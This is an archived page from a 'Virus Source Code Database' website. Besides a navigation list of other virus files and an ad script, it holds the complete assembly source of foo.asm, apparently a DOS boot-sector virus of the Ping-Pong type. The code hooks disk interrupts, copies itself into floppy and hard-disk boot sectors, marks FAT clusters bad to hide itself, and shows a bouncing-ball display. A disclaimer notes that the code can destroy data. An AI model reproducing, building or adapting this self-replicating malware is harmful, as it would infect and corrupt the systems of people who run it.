<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: foo_asm</title>
<meta name="KEYWORDS" content="foo.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for foo.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="faces_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faces_asm.php">faces_asm</a><br>
<a href="fade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fade_asm.php">fade_asm</a><br>
<a href="faerie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faerie_asm.php">faerie_asm</a><br>
<a href="fat_fuck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fat_fuck_asm.php">fat_fuck_asm</a><br>
<a href="fatman__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman__asm.php">fatman__asm</a><br>
<a href="fatman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman_asm.php">fatman_asm</a><br>
<a href="femifbia_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/femifbia_pas.php">femifbia_pas</a><br>
<a href="ffire_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/ffire_asm.php">ffire_asm</a><br>
<a href="firecide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecide_asm.php">firecide_asm</a><br>
<a href="firecris_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecris_asm.php">firecris_asm</a><br>
<a href="firecrpt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecrpt_asm.php">firecrpt_asm</a><br>
<a href="firefly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firefly_asm.php">firefly_asm</a><br>
<a href="fish___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish___asm.php">fish___asm</a><br>
<a href="fish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish__asm.php">fish__asm</a><br>
<a href="fish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish_asm.php">fish_asm</a><br>
<a href="flagyll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyll_asm.php">flagyll_asm</a><br>
<a href="flagyllz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyllz_asm.php">flagyllz_asm</a><br>
<a href="flip2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip2_asm.php">flip2_asm</a><br>
<a href="flip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip_asm.php">flip_asm</a><br>
<a href="flu_not_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_asm.php">flu_not_asm</a><br>
<a href="flu_not_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_c.php">flu_not_c</a><br>
<a href="fmt12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fmt12_asm.php">fmt12_asm</a><br>
<a href="fonetone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fonetone_asm.php">fonetone_asm</a><br>
<a href="foo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/foo_asm.php">foo_asm</a><br>
<a href="form2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/form2_asm.php">form2_asm</a><br>
<a href="formvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/formvir_asm.php">formvir_asm</a><br>
<a href="fri_13th_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fri_13th_asm.php">fri_13th_asm</a><br>
<a href="friday13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday13_asm.php">friday13_asm</a><br>
<a href="friday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday_asm.php">friday_asm</a><br>
<a href="frog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frog_asm.php">frog_asm</a><br>
<a href="froggie_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/froggie_pas.php">froggie_pas</a><br>
<a href="frtfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frtfly_asm.php">frtfly_asm</a><br>
<a href="fruitfl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfl2_asm.php">fruitfl2_asm</a><br>
<a href="fruitfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfly_asm.php">fruitfly_asm</a><br>
<a href="fruitful_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitful_asm.php">fruitful_asm</a><br>
<a href="fumanchu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fumanchu_asm.php">fumanchu_asm</a><br>
<a href="fun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fun_asm.php">fun_asm</a><br>
<a href="funked_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funked_asm.php">funked_asm</a><br>
<a href="funkybom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funkybom_asm.php">funkybom_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

.RADIX 16

jmpf    macro   x
        db      0eah
        dd      x
endm

Virus       SEGMENT
assume  cs:virus;ds:virus

jmpf    MACRO   x
        db      0eah
        dd      x
ENDM

org 0100h

begin:  jmp     short entry

                db      1eh-2 dup (?)

entry:  xor     ax,ax
        mov     ss,ax
        mov     sp,7c00
        mov     ds,ax
        mov     ax,ds:[0413]
        sub     ax,2
        mov     ds:[0413],ax
        mov     cl,06
        shl     ax,cl
        sub     ax,07c0
        mov     es,ax
        mov     si,7c00
        mov     di,si
        mov     cx,0100
        repz    movsw
        mov     cs,ax
        push    cs
        pop     ds
        call    reset
reset:  xor     ah,ah
        int     13
        and     byte ptr ds:drive,80
        mov     bx,ds:sector
        push    cs
        pop     ax
        sub     ax,0020
        mov     es,ax
        call    ler_sector
        mov     bx,ds:sector
        inc     bx
        mov     ax,0ffc0
        mov     es,ax
        call    ler_sector
        xor     ax,ax
        mov     ds:estado,al
        mov     ds,ax
        mov     ax,ds:[004c]
        mov     bx,ds:[004e]
        mov     word ptr ds:[004c],offset int_13
        mov     ds:[004e],cs
        push    cs
        pop     ds
        mov     word ptr ds:velho_13,ax
        mov     word ptr ds:velho_13+2,bx
        mov     dl,ds:drive
        jmpf    0:7c00

Esc_Sector      proc    near
                mov     ax,0301
                jmp     short cs:transferir
Esc_Sector      endp

Ler_Sector  proc  near
            mov ax,0201
Ler_Sector  endp

Transferir  proc  near
            xchg    ax,bx
            add     ax,ds:[7c1c]
            xor     dx,dx
            div     ds:[7c18]
            inc     dl
            mov     ch,dl
            xor     dx,dx
            div     ds:[7c1a]
            mov     cl,06
            shl     ah,cl
            or      ah,ch
            mov     cx,ax
            xchg    ch,cl
            mov     dh,dl
            mov     ax,bx
transf:     mov     dl,ds:drive
            mov     bx,8000
            int     13
            jnb     trans_exit
            pop     ax
trans_exit: ret
Transferir  endp

Int_13      proc    near
            push    ds
            push    es
            push    ax
            push    bx
            push    cx
            push    dx
            push    cs
            pop     ds
            push    cs
            pop     es
            test    byte ptr ds:estado,1
            jnz     call_BIOS
            cmp     ah,2
            jnz     call_BIOS
            cmp     ds:drive,dl
            mov     ds:drive,dl
            jnz     outra_drv
            xor     ah,ah
            int     1a
            test    dh,7f
            jnz     nao_desp
            test    dl,0f0
            jnz     nao_desp
            push    dx
            call    despoletar
            pop     dx
nao_desp:   mov     cx,dx
            sub     dx,ds:semente
            mov     ds:semente,cx
            sub     dx,24
            jb      call_BIOS
outra_drv:  or      byte ptr ds:estado,1
            push    si
            push    di
            call    contaminar
            pop     di
            pop     si
            and     byte ptr ds:estado,0fe
call_BIOS:  pop     dx
            pop     cx
            pop     bx
            pop     ax
            pop     es
            pop     ds
Velho_13    equ     $+1
            jmpf    0:0
Int_13      endp

Contaminar  proc    near
            mov     ax,0201
            mov     dh,0
            mov     cx,1
            call    transf
            test    byte ptr ds:drive,80
            jz      testar_drv
            mov     si,81be
            mov     cx,4
proximo:    cmp     byte ptr [si+4],1
            jz      ler_sect
            cmp     byte ptr [si+4],4
            jz      ler_sect
            add     si,10
            loop    proximo
            ret

ler_sect:   mov     dx,[si]
            mov     cx,[si+2]
            mov     ax,0201
            call    transf
testar_drv: mov     si,8002
            mov     di,7c02
            mov     cx,1c
            repz    movsb
            cmp     word ptr ds:[offset flag+0400],1357
            jnz     esta_limpa
            cmp     byte ptr ds:flag_2,0
            jnb     tudo_bom
            mov     ax,word ptr ds:[offset prim_dados+0400]
            mov     ds:prim_dados,ax
            mov     si,ds:[offset sector+0400]
            jmp     infectar
tudo_bom:   ret

esta_limpa:     cmp     word ptr ds:[800bh],0200
                jnz     tudo_bom
                cmp     byte ptr ds:[800dh],2
                jb      tudo_bom
                mov     cx,ds:[800e]
                mov     al,byte ptr ds:[8010]
                cbw
                mul     word ptr ds:[8016]
                add     cx,ax
                mov     ax,' '
                mul     word ptr ds:[8011]
                add     ax,01ff
                mov     bx,0200
                div     bx
                add     cx,ax
                mov     ds:prim_dados,cx
                mov     ax,ds:[7c13]
                sub     ax,ds:prim_dados
                mov     bl,byte ptr ds:[7c0dh]
                xor     dx,dx
                xor     bh,bh
                div     bx
                inc     ax
                mov     di,ax
                and     byte ptr ds:estado,0fbh
                cmp     ax,0ff0
                jbe     sao_3
                or      byte ptr ds:estado,4
sao_3:  mov     si,1
                mov     bx,ds:[7c0e]
                dec     bx
                mov     ds:inf_sector,bx
                mov     byte ptr ds:FAT_sector,0fe
                jmp     short continua

Inf_Sector      dw      1
Prim_Dados  dw    0c
Estado  db      0
Drive           db      1
Sector  dw      0ec
Flag_2  db      0
Flag            dw      1357
                dw      0aa55

continua:       inc     word ptr ds:inf_sector
                mov     bx,ds:inf_sector
                add     byte ptr ds:[FAT_sector],2
                call    ler_sector
                jmp     short   l7e4b

verificar:      mov     ax,3
                test    byte ptr ds:estado,4
                jz      l7e1d
                inc     ax
l7e1d:  mul     si
                shr     ax,1
                sub     ah,ds:FAT_sector
                mov     bx,ax
                cmp     bx,01ff
                jnb     continua
                mov     dx,[bx+8000]
                test    byte ptr ds:estado,4
                jnz     l7e45
                mov     cl,4
                test    si,1
                jz      l7e42
                shr     dx,cl
l7e42:  and     dh,0f
l7e45:  test    dx,0ffff
                jz      l7e51
l7e4b:  inc     si
                cmp     si,di
                jbe     verificar
                ret

l7e51:  mov     dx,0fff7
                test    byte ptr ds:estado,4
                jnz     l7e68
                and     dh,0f
                mov     cl,4
                test    si,1
                jz      l7e68
                shl     dx,cl
l7e68:  or      [bx+8000],dx
                mov     bx,word ptr ds:inf_sector
                call    esc_sector
                mov     ax,si
                sub     ax,2
                mov     bl,ds:7c0dh
                xor     bh,bh
                mul     bx
                add     ax,ds:prim_dados
                mov     si,ax
                mov     bx,0
                call    ler_sector
                mov     bx,si
                inc     bx
                call    esc_sector
infectar:       mov     bx,si
                mov     word ptr ds:sector,si
                push    cs
                pop     ax
                sub     ax,20
                mov     es,ax
                call    esc_sector
                push    cs
                pop     ax
                sub     ax,40
                mov     es,ax
                mov     bx,0
                call    esc_sector
                ret
Contaminar      endp

Semente dw      ?

FAT_sector      db    0



Despoletar      proc    near
              test  byte ptr ds:estado,2
            jnz   desp_exit
            or    byte ptr ds:estado,2
                mov     ax,0
                mov     ds,ax
                mov     ax,ds:20
                mov     bx,ds:22
                mov     word ptr ds:20,offset int_8
                mov     ds:22,cs
                push    cs
                pop     ds
                mov     word ptr ds:velho_8+8,ax
                mov     word ptr ds:velho_8+2,bx
desp_exit:      ret
Despoletar      endp

Int_8           proc    near
              push      ds
                push    ax
                push    bx
                push    cx
                push    dx
                push    cs
                pop     ds
                mov     ah,0f
                int     10
                mov     bl,al
                cmp     bx,ds:modo_pag
                jz      ler_cur
                mov     ds:modo_pag,bx
                dec     ah
                mov     ds:colunas,ah
                mov     ah,1
                cmp     bl,7
                jnz     e_CGA
                dec     ah
e_CGA:  cmp     bl,4
                jnb     e_grafico
                dec     ah
e_grafico:      mov     ds:muda_attr,ah
                mov     word ptr ds:coordenadas,0101
                mov     word ptr ds:direccao,0101
                mov     ah,3
                int     10
                push    dx
                mov     dx,ds:coordenadas
                jmp     short   limites

ler_cur:        mov     ah,3
                int     10
                push    dx
                mov     ah,2
                mov     dx,ds:coordenadas
                int     10
                mov     ax,ds:carat_attr
                cmp     byte ptr ds:muda_attr,1
                jnz     mudar_atr
                mov     ax,8307
mudar_atr:      mov     bl,ah
                mov     cx,1
                mov     ah,9
                int     10
limites:        mov     cx,ds:direccao
                cmp     dh,0
                jnz     linha_1
                xor     ch,0ff
                inc     ch
linha_1:        cmp     dh,18
                jnz     coluna_1
                xor     ch,0ff
                inc     ch
coluna_1:       cmp     dl,0
                jnz     coluna_2
                xor     cl,0ff
                inc     cl
coluna_2:       cmp     dl,ds:colunas
                jnz     esta_fixe
                xor     cl,0ff
                inc     cl
esta_fixe:      cmp     cx,ds:direccao
                jnz     act_bola
                mov     ax,ds:carat_attr
                and     al,7
                cmp     al,3
                jnz     nao_e
                xor     ch,0ff
                inc     ch
nao_e:  cmp     al,5
                jnz     act_bola
                xor     cl,0ff
                inc     cl
act_bola:       add     dl,cl
                add     dh,ch
                mov     ds:direccao,cx
                mov     ds:coordenadas,dx
                mov     ah,2
                int     10
                mov     ah,8
                int     10
                mov     ds:carat_attr,ax
                mov     bl,ah
                cmp     byte ptr ds:muda_attr,1
                jnz     nao_muda
                mov     bl,83
nao_muda:       mov     cx,1
                mov     ax,0907
                int     10
                pop     dx
                mov     ah,2
                int     10
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     ds
velho_8 equ     $+1
                jmpf    0:0
Int_8           endp

Carat_attr      dw      ?       ; 7fcd
Coordenadas     dw      0101  ; 7fcf
Direccao        dw      0101  ; 7fd1
Muda_attr       db      1       ; 7fd3
Modo_pag        dw      ?       ; 7fd4
Colunas db      ?       ; 7fd6

Virus           ENDS

END             begin

</textarea></td></tr></table></body></html>
